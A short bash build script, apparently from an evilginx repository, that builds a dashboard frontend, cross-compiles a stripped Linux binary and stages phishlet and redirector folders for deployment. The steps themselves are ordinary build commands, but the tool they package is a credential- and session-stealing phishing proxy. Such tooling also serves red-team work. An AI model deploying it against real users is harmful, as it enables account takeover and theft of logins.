#!/usr/bin/env bash
# Build a self-contained linux/amd64 evilginx binary (dashboard embedded).
# Run from the repo root: ./deploy/build-linux.sh
set -euo pipefail

cd "$(dirname "$0")/.."

echo "[*] building dashboard frontend…"
( cd dashboard/web && npm install --no-audit --no-fund && npm run build )

echo "[*] cross-compiling evilginx (linux/amd64)…"
mkdir -p deploy/out
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -trimpath -ldflags "-s -w" -o deploy/out/evilginx main.go

echo "[*] staging phishlets + redirectors…"
rm -rf deploy/out/phishlets deploy/out/redirectors
cp -r phishlets deploy/out/phishlets
[ -d redirectors ] && cp -r redirectors deploy/out/redirectors || mkdir -p deploy/out/redirectors

echo "[+] done -> deploy/out/  (evilginx, phishlets/, redirectors/)"
ls -lh deploy/out/evilginx
